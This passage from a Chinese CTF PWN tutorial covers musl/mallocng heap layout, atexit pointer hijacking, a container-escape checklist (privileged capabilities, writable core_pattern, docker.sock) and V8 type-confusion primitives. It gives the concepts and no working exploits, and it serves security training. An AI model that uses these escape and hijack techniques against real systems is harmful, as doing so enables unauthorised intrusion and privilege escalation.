musl-gcc -O0 hello.c -o hello_static -static
musl-gcc -O0 hello.c -o hello_dyn
file hello_static hello_dyn
```

输出：

```
hello_static: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, with debug_info, not stripped
hello_dyn:    ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
```

两个都能直接运行（musl 包把它的加载器装在 `/lib/ld-musl-x86_64.so.1`）：

```bash
./hello_static
./hello_dyn
```

输出：

```
hello from musl
hello from musl
```

==musl-gcc 默认编出的静态产物约 25 KB==（glibc 静态 hello 是它的几十倍）——musl 的"小"是它的设计目标，也是嵌入式选它的原因。静态产物里的指纹：

```bash
strings hello_static | grep -m2 -i musl
```

输出：

```
/usr/src/musl-1.2.5-3build1
```

（另一条指纹是加载器自带的 `musl libc (x86_64)` 版本串。）做题拿到附件，==先看解释器路径和这两条指纹，把"glibc 题"和"musl 题"分开==——两者的堆打法完全不通用，下两节展开。

### 4.2 堆形状对比：mallocng 与 ptmalloc

同一份源码在两家 libc 下堆的形状不同。演示程序连续 malloc 三块（0x18、0x18、0x500），musl 与 glibc 各编一份对照输出：

```c
/* heapdemo.c —— 同一份源码在 glibc 与 musl 下的堆形状对比 */
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    void *a = malloc(0x18);
    void *b = malloc(0x18);
    void *c = malloc(0x500);
    printf("a = %p\nb = %p\nc = %p\n", a, b, c);
    return 0;
}
```

```bash
musl-gcc -O0 heapdemo.c -o heap_musl
gcc -O0 heapdemo.c -o heap_glibc
./heap_musl
```

输出：

```
a = 0x786cff883ca0
b = 0x786cff883cc0
c = 0x786cff7bd020
```

```bash
./heap_glibc
```

输出：

```
a = 0x5666de0f2010
b = 0x5666de0f2030
c = 0x5666de0f2050
```

glibc 侧是 [[P12-glibc堆管理机制|P12]] 熟悉的形状：三个地址在同一片 brk 堆上按 0x20 递增顺序排布，全部从 top chunk 切出。musl 侧完全不同：==0x500 的 c 落在与 a、b 相距甚远的另一片内存==——musl 的分配器叫 **mallocng**，它按"尺寸类别 → 组（group）"组织内存：每个 group 是一整块独立映射的内存，内部均匀切成同尺寸的 slot；==组的管理结构 meta 记录 slot 尺寸、数量与一张空闲位图==，malloc 按位图找空位、free 翻转位图位。对照 [[P12-glibc堆管理机制|P12]] 的 ptmalloc：

| | glibc ptmalloc | musl mallocng |
| ---- | ---- | ---- |
| 组织方式 | chunk 链 + 多级 bins（tcache/smallbin/largebin/unsorted） | 尺寸类别 → group → slot + 空闲位图 |
| 元数据位置 | chunk 头（size/标志）与 bins 链表指针群 | group 头与 meta 结构，==用户块里不穿链表指针== |
| 小块快速通道 | tcache（每档一链） | ==没有 bins 家族==，位图一翻即知 |
| 泄露来源 | unsorted/smallbin 块的 fd/bk 指向 main_arena（[[P12-glibc堆管理机制#8. 一条 malloc/free 序列的全程跟踪\|P12 第 8 节]] 的 E/H 阶段） | 无 main_arena 概念；泄露目标换成 libc 自身的全局结构 |
| 典型攻击面 | tcache 投毒、unlink、House 系列（[[P13-基础堆漏洞\|P13]]–[[P15-House系列攻击技术\|P15]]） | meta/group 伪造、越界写坏位图、exit 路径的函数指针 |
| 公开资料 | 极多 | 少，==读源码为主== |

一句话总结形状差异：==ptmalloc 的堆是一根由 size 字段串起来的链，mallocng 的堆是一片按位图记账的格子==。

> [!info]- mallocng 的源码导读入口
> musl 源码仓库的 `src/malloc/mallocng/` 目录是全部实现，核心三件：`malloc.c`（分配主路径）、`free.c`（释放与位图回收）、`meta.h`（meta/group 结构定义，一百多行）。meta 里与利用直接相关的字段：slot 尺寸类别、组内 slot 数、可用位图 avail 与已释放位图 freed_mask。读的顺序建议 meta.h → malloc.c → free.c，配合 4.2 的对照输出，每个地址都能在源码逻辑里找到出处。

### 4.3 exit/atexit 劫持思路

musl 1.2.x 堆题的常见收尾目标。原理：程序退出时 `exit()` 依次做两件事——==调用所有 `atexit` 登记过的函数==（musl 内部由 `__funcs_on_exit` 完成）、==刷新并关闭 stdio 流==（`__stdio_exit`）。atexit 登记的函数指针（连同参数）记录在 ==libc 数据区的一张槽位表==里，表满后新开一块并连成单链。对动态链接的 musl 题，这张表就在 libc 的可写数据里——==拿到一次任意写，把链上的函数指针换成目标地址，程序正常退出时就替你调用它==，与 glibc 的 `__exit_funcs` 劫持思路同族（glibc 那份有指针加密，[[P15-House系列攻击技术|P15]] 对照过），musl 这条链的结构则简单得多。

源码导读：musl 仓库的 `src/exit/atexit.c`（登记链与 `__funcs_on_exit`）加 `src/exit/exit.c`（退出顺序），两个文件加起来百行上下，==把链长什么样、指针存在哪读完就有数==。完整利用需要与具体题目的写原语配合（写什么、写哪、何时触发 exit），本章建立坐标即可，不动手。

### 4.4 解题套路迁移

| 漏洞类型 | 迁移情况 |
| ---- | ---- |
| 栈溢出/ROP | ==全套不变==：偏移、覆盖、gadget 串联原样适用；musl 静态产物同样是 gadget 大本营（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] 的 ret2syscall 前提照常成立） |
| 格式化字符串 | 不变：漏洞机制在 libc 无关层（[[P09-格式化字符串漏洞\|P9]]），只是泄露/改写的目标地址换成 musl 的结构 |
| 堆利用 | ==重学==：[[P12-glibc堆管理机制\|P12]]–[[P17-堆风水与通用利用思路\|P17]] 的肌肉记忆（tcache 计数、bin 链、main_arena）全部作废，回到"管理器把元数据记在哪"的原点（4.2） |
| 调试 | 与 3 节同法：qemu-user 跑跨架构目标；x86-64 musl 题本机直接跑 |

> [!note] "aarch64 + musl" 组合题的读法
> 真实赛题常把两章叠在一起：架构是 ARM64（本章 3 节的约定与工具），libc 是 musl（本节的堆与 exit 路径）。拆开看：==栈的部分用 3 节，堆与收尾劫持用 4 节==，两套知识互不干扰。

## 5. 容器逃逸题型概览

容器是 PWN 的下一个攻击面。本节是概念与学习路线，不展开实操。

**什么算容器题。** 题目给的不是单个二进制，而是一个跑在 Docker（或同类运行时）里的环境：你拿到容器内的入口（web 服务、nc 服务、一个 getshell 后的交互界面），==flag 不在容器里，在宿主机上==。考察点从"利用一个程序"变成"利用运行时的隔离边界"——namespace 隔离的是视图，cgroup 管的是资源，==真正共享的内核才是安全边界==。

**常见考点清单。** 拿到容器内的立足点后，按这张清单逐项排查：

| 检查项 | 命令/位置 | 危险信号 |
| ---- | ---- | ---- |
| 特权模式 | `capsh --print`、`/proc/self/status` 的 CapEff | 含 `CAP_SYS_ADMIN`——特权容器，挂载宿主磁盘、改内核参数的门全开 |
| 挂载面 | `cat /proc/self/mountinfo` | 宿主的 `/`、`/etc`、docker.sock、`/proc/sys` 可写挂在容器里 |
| `/proc/sys` 可写 | 尝试写 `core_pattern` 等内核参数 | 改写后在宿主侧触发（崩溃/回连），是经典逃逸通道 |
| docker.sock | `/var/run/docker.sock` 存在且可写 | 等于把 dockerd 的控制权交给你，可起一个挂宿主根的新容器 |
| 内核版本 | `uname -r` | 内核漏洞（[[P18-KernelPWN入门\|P18]] 的攻击面）在容器里同样成立——内核是共享的，提权即可能越界 |

**学习路线。** 三步走：先把 [[P18-KernelPWN入门|P18]] 的内核题基本功打通（逃逸的硬招常是内核漏洞）；再读 namespace/capability 的机制文档，搞清"容器到底隔离了什么、没隔离什么"；最后在专门的练习环境里做逃逸场景题，把清单变成肌肉记忆。==容器逃逸是 L4 之后的方向，概念先到位，动手放在内核功底之后==。

## 6. 浏览器/V8 利用入门

浏览器是真实世界与顶级 CTF 共同的前沿。本节建立概念地图，标注为选做方向。

**战场在哪。** 浏览器解析完全不可信的输入（JS），又要跑得快，于是引入 ==JIT（即时编译）==：解释器先逐条执行字节码，同时统计哪些函数是热点；热点函数按"观察到的类型"编译成本地机器码。流程画出来：

```text
JS 源码:   function f(x) { return x.a; }
解释器:    逐条字节码执行，慢但稳
JIT 观察:  f 被调了一万次，x 一直是 {a: 1.5}（浮点字段）
JIT 编译:  生成机器码——"直接读 x 偏移 8 处的 double"，不再检查类型
恶意输入:  让 x 突然变成 {a: 某对象}
结果:      机器码仍按"double"读那个字段——指针被当成浮点数读出
```

==类型混淆==就是最后一步：优化器的假设被特制输入打破，数据以错误的类型解释。V8 的对象布局里，浮点与指针共用 64 位槽位，混淆的收益尤其直接。

**两大原语的直觉。** 类型混淆给攻击者两块基石：

- **addrof（地址泄露）**：让"对象"经过一条按"浮点"写的路径——==把对象的地址当作一个 double 读出来==，对象的内存地址变成一个可计算的数值；
- **fakeobj（伪造对象）**：反过来，让"浮点数"经过一条按"对象指针"读的路径——==把自己控制的数值变成一个"对象"==，指向提前布置好的假结构。

有了 addrof 就知道东西在哪，有了 fakeobj 就能谎报东西在哪——两者组合即可从"读错一个字段"升级到对进程内存的任意读写，再转向浏览器进程里的可执行区域完成代码执行。

**d8 与入门路径。** d8 是 V8 的命令行调试壳（Chromium 之外独立分发），是 V8 题的标准练习场：从 V8 官方渠道取对应平台的 d8 可执行文件，或按官方文档从源码构建；练习时给 d8 加 `--allow-natives-syntax` 参数，可用 `%DebugPrint(obj)` 一族内置函数直接打印对象地址、类型与布局——==JIT 优化前后对象长什么样，用它看最直观==。学习顺序建议：JS 与对象模型基础 → 读一篇完整的入门 writeup 跟通全链 → 在带 patch 的练习版 d8 上复现（CTF 的 V8 题几乎都从"官方补丁 diff"入手定位引入的缺陷）。

> [!note] 选做方向的定位
> V8 利用需要 JS 语言功底与较强的逆向阅读能力，战线长、单题周期久。==本章只建立概念坐标系==；把 P1–P17 的原生功底打牢后再决定是否进入，入口资料认准 V8 官方文档与知名 writeup 集合。

## 7. 平台迁移总结表

四个坐标轴 × 四个平台，迁移时从这张表定位差异：

| 坐标轴 | x86-64 glibc（基线） | Windows PE（x64） | ARM64 Linux（glibc） | musl（常与 ARM64 组合） |
| ---- | ---- | ---- | ---- | ---- |
| 调用约定 | SysV：rdi/rsi/rdx/rcx/r8/r9 | Microsoft x64：rcx/rdx/r8/r9 + 32 字节 shadow space | AAPCS64：x0–x7，返回地址在 x30 | 随架构不随 libc：ARM64 同左，x86-64 即基线 |
| 保护识别 | `pwn checksec`（ELF） | `objdump -x` 读 DllCharacteristics（checksec 不认 PE）；GS 看 Load Configuration 与符号表 | `pwn checksec` 原样适用 | 同左 |
| 工具链 | gcc | x86_64-w64-mingw32-gcc（产物 Windows 直接运行） | aarch64-linux-gnu-gcc + qemu-aarch64 -L | musl-gcc |
| 栈形状要点 | push/pop，ret 弹栈，入口差 8 | 同左（差 8 同样存在，垫 ret 修法通用） | stp/ldp 成对，ret 跳 x30，==无差 8== | 同基线或同 ARM64 |
| 堆管理器 | ptmalloc（[[P12-glibc堆管理机制\|P12]]） | 本章未展开（Windows 堆 API，栈题为主） | ptmalloc（交叉包的 glibc） | mallocng：group + 空闲位图，无 bins 家族 |
| 典型利用入口 | [[P06-栈溢出原理与ret2win\|P6]]/[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] 骨架 | P6 骨架 + ret 垫片 + 文件交互 | P6 骨架 + ldp 链节拍 | 栈同基线；堆按 4.2 重学 |

==迁移的心法一行==：先把四个坐标轴逐一对照，找出"变了什么"；==没变的直接套旧答案，变了的只重学那一格==。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `pwn checksec` 对 PE 报 Magic number does not match | checksec 只认 ELF：PE 的保护看 `objdump -x` 的 DllCharacteristics 逐位（2.1），GS 另查 Load Configuration 与 security_cookie 符号 |
| Windows exp 直跳 win 段错误，垫一格 ret 后通 | Microsoft x64 的入口对齐与 SysV 相同，ret2win 跳入差 8 字节：裸 ret gadget 垫在 win 前（2.3） |
| `vuln.exe < payload.bin` 有输出但 flag 丢失 | 崩溃发生在 stdout 缓冲刷出之前：演示程序已 `setvbuf` 关缓冲；改编译产物时把这一句带上 |
| mingw 编译报 `gets` 的 attribute warning | 与 Linux 的链接器警告不同，mingw 在编译期属性层提示：同属"危险函数被点名"，产物照常生成（2.1） |
| `qemu-aarch64` 报无法执行或找不到 aarch64 的库 | 动态链接的 aarch64 ELF 缺 `-L`：加 `-L /usr/aarch64-linux-gnu`，或改 `-static` 编译（3.1） |
| ARM64 下 cyclic 崩了却查不出偏移 | qemu-user 崩溃只报 uncaught signal，不给寄存器：偏移按 3.2 反汇编手算，或装 gdb-multiarch 配 `qemu -g` 远程调试读现场 |
| ARM64 payload 偏移"看着对"，程序崩了但没有 win 的迹象 | 地址落进了 caller 的 saved x29 槽而不是会被装进 x30 的槽：回反汇编核对 buf 与 ldp 槽位的关系（3.2 的 warning、3.3 的对照） |
| ROPgadget 在 ARM64 产物里搜不到 `pop rdi ; ret` | ARM64 没有 pop：找 `ldr`/`ldp` 变体、借跳入时寄存器的现成值，或把 `--depth` 调大（3.4） |
| ARM64 gadget 链走到一半返回地址"漂移" | 链上的 `bl` 写了 x30：检查每个含 bl 的片段，x30 的归属要重新排（3.4） |
| musl 动态程序换台机器跑不起来 | 缺 musl 加载器 `/lib/ld-musl-*.so.1`：题目环境装 musl 包即可；识别特征（解释器路径、NEEDED `libc.so`）见 4.1 |
| musl 堆题按 glibc 题解的偏移与手法操作全部失灵 | 两家分配器不通用：先确认 libc，musl 按 mallocng 的 group/位图重新分析（4.2） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务：一道非 x86-glibc 的完整题
> 主线任务二选一，选做一项另计：
> ① **ARM64 带参 ret2win**：把 3.1 的 `vuln_arm.c` 的 `win` 改成带参数校验版（`win(long key)`，key 对上 0xcafebabe 才发 flag），交叉编译后走完 3.2–3.5 全流程。难点在 3.4 预告过：装 x0 没有 `pop` 可用——提示两条路：让 win 从全局变量读 key，改打"写全局变量"的一格；或在更大的二进制（静态链接、或题目附件）里搜 `ldr x0, [sp, #…]` 变体。
> ② **musl ret2win**：用 `musl-gcc` 重编 [[P06-栈溢出原理与ret2win|P6]] 的漏洞程序并完成 ret2win，对照 P6 的步骤清单逐项打钩——预期结论是全部步骤原样适用，这正是 4.4"栈技巧不变"的亲身体会。
> 选做：装一个 d8（`--allow-natives-syntax`），用 `%DebugPrint` 观察一个 JS 对象的地址与内部布局，对第 6 节的对象模型建立第一印象。

延伸阅读按平台分：

- **Windows**：mingw-w64 项目文档（编译选项与 `--disable-*` 链接器开关）；微软官方的 x64 软件调用约定文档（Microsoft Docs 搜 "x64 software conventions"，shadow space 与栈布局的权威出处）；[[R06-动态调试GDB与x64dbg|R06]] 的 x64dbg 一节。
- **ARM64**：ARM 官方架构规范 AAPCS64（文档号 IHI0055，调用约定与栈对齐的第一手出处）；qemu-user 手册；[[R13-多平台逆向专题|R13]] 第 11 节的 ARM32/MIPS 扩展。
- **musl**：musl 官网与源码仓库（`src/malloc/mallocng/`、`src/exit/`）；mallocng 的设计文档（musl 官网博客的 allocator 篇，结构设计的动机讲得最清楚）。
- **容器逃逸**：Docker 官方安全文档（runtime privilege 与 capabilities 章节）；namespace/capability 的内核手册页（`man 7 namespaces`、`man 7 capabilities`）；[[P18-KernelPWN入门|P18]] 的内核攻击面。
- **V8**：V8 官方文档站（v8.dev，构建与 d8 用法）；JS 对象模型与 JIT 的官方博客文章；知名 CTF 战队的 V8 入门 writeup 集合。
